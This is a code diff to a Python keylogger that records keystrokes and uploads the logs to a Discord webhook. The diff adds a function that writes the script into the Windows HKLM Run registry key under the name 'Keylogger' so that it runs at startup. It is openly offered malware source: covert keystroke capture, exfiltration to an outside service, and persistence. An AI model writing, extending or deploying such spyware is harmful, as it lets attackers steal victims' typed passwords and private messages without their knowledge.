@@ -4,6 +4,7 @@ import time
 import keyboard
 import pyautogui
 import requests
+import winreg as reg
 
 # Set the webhook URL for Discord
 webhook_url = "YOUR_DISCORD_WEBHOOK_URL"
@@ -44,7 +45,13 @@ def send_to_discord():
             os.remove(log_path)  # Remove the log file if successfully sent to Discord
     except:
         pass
-
+# Add the keylogger to the Windows Registry
+def add_to_registry():
+    key = reg.HKEY_LOCAL_MACHINE
+    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+    with reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS) as regkey:
+        reg.SetValueEx(regkey, "Keylogger", 0, reg.REG_SZ, sys.executable + ' "<PATH_TO_KEYLOGGER_SCRIPT>"')
+        
 # Start the keylogger
 keyboard.on_release(keylogger)
 
